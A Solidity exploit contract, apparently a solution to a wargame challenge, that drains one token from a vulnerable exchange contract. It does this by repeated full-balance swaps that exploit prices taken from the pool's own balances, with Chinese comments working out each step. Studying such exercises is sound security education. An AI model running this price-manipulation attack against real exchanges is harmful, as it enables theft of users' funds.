// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/Test.sol";

//在编写Hack前通过remix调用token1的Transfer函数，将自己的10个token1转到Dex合约
//其实不用专门转，直接用10个token1换10个token2打破汇率平衡更快，核心是dex合约中
//较少的货币更值钱     swap之前需要先将自己拥有的货币approve,但是approve函数必须是
//token owner才可以调用，所以将自己钱包的token转到hack合约(或者approve，在hack合约中transferFrom)
//需要计算最后一次投入多少token使dex合约恰好为0，不然会报token不足错误

// TOKEN1  |  TOKEN2
// 10  100  | 100  10
// 0   110  | 100  10
// 11  99   | 110  0
// 0   110  | 98   12

// TOKEN1  |  TOKEN2
// 10  100  | 100  10
// 0   110  | 90  20
// 24  86   | 110  0
// 0   110  | 80   30
// 41  69   | 110  0
// 0   110  | 45   65   此处计算需要投入多少token使得Token1恰好为0
// amount * 110 / 45 == 110    amount=45
contract Hack {
    IDex idex;
    IERC20 token1;
    IERC20 token2;

    constructor(address target) {
        idex = IDex(target);
        token1 = IERC20(idex.token1());
        token2 = IERC20(idex.token2());
    }

    // function pwn(address token1, address token2) public {
    //     console.log(idex.balanceOf(token1, address(this)));
    //     while (idex.balanceOf(token1, address(idex)) != 0 && idex.balanceOf(token2, address(idex)) != 0) {
    //         if (idex.getSwapPrice(token1, token2, 1) == 0) {
    //             uint256 amount = idex.balanceOf(token2, address(this));
    //             idex.approve(address(idex), amount);
    //             idex.swap(token2, token1, amount);
    //         } else {
    //             uint256 amount = idex.balanceOf(token1, address(this));
    //             idex.approve(address(idex), amount);
    //             idex.swap(token1, token2, amount);
    //         }
    //     }
    //     require(
    //         (idex.balanceOf(token1, address(idex)) == 0 || idex.balanceOf(token2, address(idex)) == 0), "Hack Failed!"
    //     );
    // }
    function pwn() external { 
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(idex), type(uint256).max); //直接把approve给最大，让idex合约随便transferFrom攻击合约的代币
        token2.approve(address(idex), type(uint256).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        idex.swap(address(token2), address(token1), 45);

        require(token1.balanceOf(address(idex)) == 0, "Hack Failed");
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        idex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }
}

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function owner() external view returns (address);

    function setTokens(address _token1, address _token2) external;

    function addLiquidity(address token_address, uint256 amount) external;

    function swap(address from, address to, uint256 amount) external;

    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);

    function approve(address spender, uint256 amount) external;

    function balanceOf(address token, address account) external view returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
